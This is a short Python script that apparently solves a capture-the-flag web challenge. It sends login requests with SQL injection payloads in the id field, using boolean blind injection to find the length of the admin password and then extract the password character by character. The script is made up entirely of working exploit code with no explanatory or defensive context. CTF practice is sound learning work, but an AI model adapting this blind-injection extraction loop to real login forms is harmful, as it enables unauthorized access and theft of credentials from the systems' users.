import requests
url = 'http://ctfq.u1tramarine.blue/q6/'

password_length = 1
for i in range(50):
    sql = f"admin' AND (SELECT LENGTH(pass) FROM user WHERE id = 'admin') = {i} --"
    login = {'id': sql, 'pass': 'dummy'}

    r = requests.post(url, data=login)
    if ('Congratulations!' in r.text):
        print("password length", i)
        password_length = i
        break


def pass_match(i: int, pw: str) -> bool:
    url = "http://ctfq.u1tramarine.blue/q6/"
    sql = f"admin' AND SUBSTR((SELECT pass FROM user WHERE id = 'admin'), {i}, 1) = '{pw}' --"
    login = {
        'id': sql,
        'pass': ""
    }
    r = requests.post(url, data=login)
    return ('Congratulations!' in r.text)


password = ""
for i in range(1, password_length + 1):
    for j in "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$&()*+,-./:;<=>?@[\]^_`{|}~":
        if (pass_match(i, j)):
            password += j
            print(password)
            break
print("admin's password is", password)
